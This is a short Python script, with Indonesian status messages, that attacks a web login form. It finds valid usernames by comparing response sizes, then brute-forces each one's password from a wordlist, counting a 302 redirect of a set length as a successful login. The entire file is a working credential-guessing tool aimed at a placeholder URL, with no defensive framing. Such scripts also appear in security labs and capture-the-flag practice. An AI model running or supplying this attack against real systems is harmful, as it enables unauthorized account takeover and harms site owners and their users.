import requests

URL = "https://urlsite.com"
USERNAME = "username.txt"
PASSWORD = "password.txt"
HEADERS = {
    "Content-Type":"application/x-www-form-urlencoded"
}

def check_username(username):
    data = {
        "username": username,
        "passweord": "password"
    }
    response = requests.post(URL,headers=HEADERS,data=data)
    if len(response.text) > 2986:
        print (f"[v] USERNAME VALID")
        return True
    else:
        print(f"[x] USERNAME TIDAK VALID")
        return False

def try_password(username,password):
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL,headers=HEADERS,data=data, allow_redirects=False)
    if response.status_code == 302 and len(response.text) == 170:
        print(f"[v] LOGIN BERHASIL")
        return True
    else:
        print(f"{username}:{password}")
        return False

valid_data = []
with open(USERNAME, 'r')  as file:
  for user in file:
    user = user.strip()
    if check_username(user):
        valid_data.append(user)

for valid_user in valid_data:
    with open(PASSWORD, 'r')  as file:
        for pw in file:
            pw = pw.strip()
            if try_password(valid_user, pw):
                break